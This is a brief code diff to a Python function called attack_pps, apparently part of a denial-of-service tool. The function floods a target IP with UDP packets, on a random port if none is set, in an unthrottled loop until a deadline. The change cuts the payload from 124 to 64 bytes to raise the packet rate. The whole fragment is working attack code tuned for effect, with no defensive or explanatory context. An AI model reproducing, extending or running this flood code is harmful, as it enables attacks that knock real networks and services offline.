@@ -80,7 +80,7 @@ def attack_pps(ip, port, end_time, size):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             dport = random.randint(1, 65535) if port == 0 else port
-            data = b' ' * 124  
+            data = b' ' * 64 
             while time.time() < end_time:
                 s.sendto(data, (ip, dport))
         except Exception as e:
